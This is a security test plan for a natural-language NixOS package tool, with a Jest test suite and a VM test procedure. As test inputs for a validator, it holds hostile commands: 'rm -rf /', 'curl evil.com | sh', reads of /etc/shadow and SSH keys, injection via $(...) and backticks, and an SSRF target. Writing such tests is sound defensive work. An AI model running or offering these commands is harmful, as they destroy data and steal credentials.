# Nix for Humanity - Security Test Scenarios

## 🛡️ Security Test Matrix

### 1. Command Injection Tests
```bash
# Test 1: Basic command injection
"install firefox; rm -rf /"
"install $(whoami)"
"install `cat /etc/passwd`"
"install firefox && curl evil.com | sh"

# Test 2: Path traversal
"install ../../etc/passwd"
"show me /nix/store/../../../etc/shadow"
"what is in ~/.ssh/id_rsa"

# Test 3: Nix expression injection
"install firefox --expr 'import <nixpkgs> {}; builtins.exec \"id\"'"
"update system --option sandbox false"
```

### 2. Sandbox Escape Tests
```bash
# Test 1: Nix daemon access
"install package with extra-sandbox-paths /tmp/daemon"
"configure nix to use trusted-users testuser"

# Test 2: Build-time network access
"install package that phones home"
"build custom derivation with fetchurl"

# Test 3: Container escape
"access host filesystem from container"
"modify /nix/store from build"
```

### 3. Permission Escalation Tests
```bash
# Test 1: Sudo exploitation
"run command as root"
"install suid binary"
"modify system configuration"

# Test 2: Service manipulation
"restart nix-daemon"
"stop firewall service"
"enable ssh with root login"

# Test 3: File system access
"read /etc/shadow"
"write to /etc/nixos/configuration.nix"
"modify /nix/store permissions"
```

### 4. Resource Exhaustion Tests
```bash
# Test 1: Memory bombs
"install 1000 packages simultaneously"
"search with regex '.*' repeated 1000 times"
"create infinite recursion in query"

# Test 2: Disk exhaustion
"download 100GB package"
"create large temporary files"
"fill up /nix/store"

# Test 3: CPU exhaustion
"compile chromium from source"
"run infinite loop in build phase"
"spawn thousands of processes"
```

### 5. Network Security Tests
```bash
# Test 1: SSRF attacks
"fetch content from http://169.254.169.254/"
"install from file:///etc/passwd"
"search packages on internal-server.local"

# Test 2: DNS rebinding
"install from attacker-controlled domain"
"fetch updates from changing IP"

# Test 3: Data exfiltration
"send system info to external server"
"upload nix store to pastebin"
"leak environment variables"
```

## 🧪 Test Implementation

### Automated Security Test Suite
```typescript
// security-tests.ts
import { NixExecutor } from '../backend/nix-executor';
import { SecurityValidator } from '../backend/security';

describe('Security Tests', () => {
  let executor: NixExecutor;
  let validator: SecurityValidator;
  
  beforeEach(() => {
    executor = new NixExecutor({ dryRun: true });
    validator = new SecurityValidator();
  });
  
  describe('Command Injection Prevention', () => {
    const dangerousInputs = [
      'firefox; rm -rf /',
      'firefox$(whoami)',
      'firefox`id`',
      'firefox && curl evil.com | sh',
      'firefox | tee /etc/passwd',
      'firefox > /dev/null; cat /etc/shadow'
    ];
    
    dangerousInputs.forEach(input => {
      it(`should reject: ${input}`, async () => {
        const result = await validator.validate(input);
        expect(result.safe).toBe(false);
        expect(result.reason).toContain('injection');
      });
    });
  });
  
  describe('Path Traversal Prevention', () => {
    const traversalInputs = [
      '../../../etc/passwd',
      '/nix/store/../../../root/.ssh/id_rsa',
      '~/.ssh/private_key',
      '$HOME/.gnupg'
    ];
    
    traversalInputs.forEach(input => {
      it(`should sanitize: ${input}`, async () => {
        const sanitized = validator.sanitizePath(input);
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toMatch(/^[~$]/);
      });
    });
  });
  
  describe('Sandbox Enforcement', () => {
    it('should not expose nix-daemon socket', async () => {
      const config = executor.getSandboxConfig();
      expect(config.extraSandboxPaths).not.toContain('/tmp/daemon');
      expect(config.sandboxEnabled).toBe(true);
    });
    
    it('should restrict network access during builds', async () => {
      const config = executor.getBuildConfig();
      expect(config.allowNetwork).toBe(false);
      expect(config.fixedOutputDerivations).toBe(false);
    });
  });
  
  describe('Resource Limits', () => {
    it('should enforce memory limits', async () => {
      const limits = executor.getResourceLimits();
      expect(limits.memoryMax).toBeLessThanOrEqual(512 * 1024 * 1024);
    });
    
    it('should limit concurrent operations', async () => {
      const promises = Array(100).fill(0).map(() => 
        executor.execute({ command: 'nix-env', args: ['-qa'] })
      );
      
      await expect(Promise.all(promises)).rejects.toThrow('rate limit');
    });
  });
});
```

### Manual Testing Checklist

#### Pre-Test Setup
- [ ] Fresh VM with NixOS 24.05
- [ ] No network access except localhost
- [ ] SELinux/AppArmor enabled
- [ ] Audit logging enabled
- [ ] Resource monitoring active

#### Test Execution
1. **Start in dry-run mode**
   ```bash
   NIX_DRY_RUN=true npm start
   ```

2. **Monitor logs**
   ```bash
   journalctl -f -u nix-for-humanity
   tail -f /var/log/audit/audit.log
   ```

3. **Resource monitoring**
   ```bash
   htop
   iotop
   nethogs
   ```

#### Security Validation
- [ ] No commands execute in dry-run mode
- [ ] All dangerous inputs rejected
- [ ] Sandbox remains intact
- [ ] No privilege escalation
- [ ] Resource limits enforced
- [ ] Audit logs capture attempts

## 🚨 Known Security Considerations

### From Research (2024/2025):
1. **Nix daemon exposure** - Never expose `/tmp/daemon` in sandbox
2. **Container root access** - Always use unprivileged containers
3. **Vendoring vulnerabilities** - Scan all dependencies
4. **Flakes security** - Git integration can leak secrets

### Mitigations Applied:
1. ✅ Strict command whitelisting
2. ✅ No sandbox path modifications
3. ✅ Unprivileged service user
4. ✅ Resource limits enforced
5. ✅ Network isolation
6. ✅ Audit logging
7. ✅ Input sanitization
8. ✅ Path traversal prevention

## 📋 VM Test Procedure

### 1. Build Test VM
```bash
cd testing
nix-build vm-test-setup.nix -A driver
./result/bin/nixos-test-driver
```

### 2. Interactive Testing
```python
# In the test driver
machine.start()
machine.wait_for_unit("multi-user.target")

# Start our service
machine.succeed("systemctl start nix-for-humanity")
machine.wait_for_open_port(3456)

# Run security tests
machine.succeed("curl -X POST http://localhost:3456/api/test-security")

# Try malicious inputs
machine.fail("""
  curl -X POST http://localhost:3456/api/execute \
    -d '{"command": "rm", "args": ["-rf", "/"]}'
""")

# Check audit logs
machine.succeed("ausearch -k nix-humanity-access")
```

### 3. Automated Test Suite
```bash
# Run full test suite
npm run test:security

# Run specific security tests
npm run test:security:injection
npm run test:security:sandbox
npm run test:security:resources
```

## 🔒 Security Checklist Before Testing

### Code Review
- [ ] All user inputs sanitized
- [ ] Command whitelist enforced
- [ ] No shell execution
- [ ] No eval() or Function()
- [ ] Dependencies audited

### Configuration
- [ ] Sandbox enabled
- [ ] Service user unprivileged  
- [ ] Resource limits set
- [ ] Network restrictions
- [ ] Filesystem isolation

### Runtime
- [ ] Audit logging active
- [ ] Monitoring enabled
- [ ] Rate limiting working
- [ ] Error messages sanitized
- [ ] No stack traces exposed

## 📊 Expected Results

### Secure Behavior:
- Dangerous commands → Rejected with safe error
- Resource exhaustion → Rate limited, capped
- Injection attempts → Sanitized or rejected
- Privilege escalation → Permission denied
- Network attacks → Connection refused

### User Experience:
- Clear error messages
- Helpful suggestions
- No technical details exposed
- Graceful degradation
- Safe mode always available